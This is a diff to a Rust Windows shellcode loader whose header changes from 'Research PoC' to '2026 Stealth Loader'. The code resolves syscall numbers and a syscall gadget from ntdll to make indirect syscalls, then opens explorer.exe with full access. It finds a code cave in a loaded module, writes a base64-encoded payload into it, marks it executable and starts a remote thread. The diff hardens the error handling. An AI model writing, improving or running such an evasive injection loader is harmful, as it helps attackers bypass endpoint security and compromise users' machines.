@@ -10,7 +10,7 @@ use windows_sys::Win32::Foundation::*;
 
 /*
     ================================================================================
-    FINAL 2026 RESEARCH PoC: ROBUST REMOTE MODULE STOMPING & INDIRECT SYSCALLS
+    2026 STEALTH LOADER - FINAL ROBUST EDITION
     ================================================================================
 */
 
@@ -94,21 +94,22 @@ unsafe fn find_ssn_and_gadget(ntdll: *mut c_void, h: u32) -> Option<(u32, usize)
     let ords = std::slice::from_raw_parts((base + (*exp_dir).AddressOfNameOrdinals as usize) as *const u16, (*exp_dir).NumberOfNames as usize);
 
     for i in 0..(*exp_dir).NumberOfNames as usize {
-        let name = CStr::from_ptr((base + names[i] as usize) as *const i8).to_str().ok()?;
-        if dbj2(name) == h {
-            let ord = ords[i] as usize;
-            let ptr = (base + functions[ord] as usize) as *const u8;
-            let mut gadget = 0usize;
-            for j in 0..500 { if *ptr.add(j) == 0x0F && *ptr.add(j+1) == 0x05 && *ptr.add(j+2) == 0xC3 { gadget = ptr.add(j) as usize; break; } }
-            if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 { return Some((*(ptr.add(4) as *const u32), gadget)); }
-            for j in 1..32 {
-                if ord >= j {
-                    let up = (base + functions[ord - j] as usize) as *const u8;
-                    if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 { return Some(((*(up.add(4) as *const u32)).wrapping_add(j as u32), gadget)); }
-                }
-                if ord + j < (*exp_dir).NumberOfFunctions as usize {
-                    let down = (base + functions[ord + j] as usize) as *const u8;
-                    if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 { return Some(((*(down.add(4) as *const u32)).wrapping_sub(j as u32), gadget)); }
+        if let Ok(name) = CStr::from_ptr((base + names[i] as usize) as *const i8).to_str() {
+            if dbj2(name) == h {
+                let ord = ords[i] as usize;
+                let ptr = (base + functions[ord] as usize) as *const u8;
+                let mut gadget = 0usize;
+                for j in 0..500 { if *ptr.add(j) == 0x0F && *ptr.add(j+1) == 0x05 && *ptr.add(j+2) == 0xC3 { gadget = ptr.add(j) as usize; break; } }
+                if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 { return Some((*(ptr.add(4) as *const u32), gadget)); }
+                for j in 1..32 {
+                    if ord >= j {
+                        let up = (base + functions[ord - j] as usize) as *const u8;
+                        if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 { return Some(((*(up.add(4) as *const u32)).wrapping_add(j as u32), gadget)); }
+                    }
+                    if ord + j < (*exp_dir).NumberOfFunctions as usize {
+                        let down = (base + functions[ord + j] as usize) as *const u8;
+                        if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 { return Some(((*(down.add(4) as *const u32)).wrapping_sub(j as u32), gadget)); }
+                    }
                 }
             }
         }
@@ -116,10 +117,10 @@ unsafe fn find_ssn_and_gadget(ntdll: *mut c_void, h: u32) -> Option<(u32, usize)
     None
 }
 
-// --- Main Execution ---
+// --- Main Program ---
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("[*] Final 2026 Stealth Loader Refined PoC");
+    println!("[*] 2026 Advanced Stealth Loader");
     let payload_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
     let shellcode = general_purpose::STANDARD.decode(payload_b64)?;
 
@@ -135,7 +136,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let mut buffer = vec![0u8; 1024 * 1024];
         let mut len = 0u32;
-        sys_call(ssn_query, gadget, 5, buffer.as_mut_ptr() as usize, buffer.len(), &mut len as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
+        let mut st = sys_call(ssn_query, gadget, 5, buffer.as_mut_ptr() as usize, buffer.len(), &mut len as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
+        if st != 0 { return Err("Query failed".into()); }
+
         let mut exp_pid: HANDLE = null_mut();
         let mut offset = 0;
         loop {
@@ -147,13 +150,13 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             if (*info).NextEntryOffset == 0 { break; }
             offset += (*info).NextEntryOffset as usize;
         }
-        if exp_pid.is_null() { return Err("explorer.exe not found".into()); }
+        if exp_pid.is_null() { return Err("Explorer not found".into()); }
 
         let mut h_proc: HANDLE = null_mut();
         let mut oa = OBJECT_ATTRIBUTES { Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32, RootDirectory: null_mut(), ObjectName: null_mut(), Attributes: 0, SecurityDescriptor: null_mut(), SecurityQualityOfService: null_mut() };
         let mut cid = CLIENT_ID { UniqueProcess: exp_pid, UniqueThread: null_mut() };
-        sys_call(ssn_open, gadget, &mut h_proc as *mut _ as usize, 0x1FFFFF, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
-        if h_proc.is_null() { return Err("open failed".into()); }
+        st = sys_call(ssn_open, gadget, &mut h_proc as *mut _ as usize, 0x1FFFFF, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
+        if st != 0 || h_proc.is_null() { return Err("Open failed".into()); }
 
         let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
         sys_call(ssn_proc, gadget, h_proc as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>(), 0, 0, 0, 0, 0, 0, 0);
@@ -197,8 +200,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             if cave_addr != 0 { break; }
             curr_link = entry.InLoadOrderLinks.Flink;
         }
-        if cave_addr == 0 { return Err("cave failed".into()); }
-        println!("[+] Target cave: 0x{:x}", cave_addr);
+        if cave_addr == 0 { return Err("Cave failed".into()); }
+        println!("[+] Injection Target: 0x{:x}", cave_addr);
 
         let mut base = cave_addr as *mut c_void;
         let mut sz = shellcode.len();
@@ -208,10 +211,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         sys_call(ssn_protect, gadget, h_proc as usize, &mut base as *mut _ as usize, &mut sz as *mut _ as usize, PAGE_EXECUTE_READ as usize, &mut old as *mut _ as usize, 0, 0, 0, 0, 0, 0);
 
         let mut h_th: HANDLE = null_mut();
-        sys_call(ssn_thread, gadget, &mut h_th as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
-        if !h_th.is_null() {
-            println!("[+] Success.");
+        st = sys_call(ssn_thread, gadget, &mut h_th as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
+        if st == 0 && !h_th.is_null() {
+            println!("[+] Execution Started.");
             windows_sys::Win32::System::Threading::WaitForSingleObject(h_th, 0xFFFFFFFF);
+        } else {
+            println!("[-] Exec failed: 0x{:x}", st);
         }
     }
     Ok(())
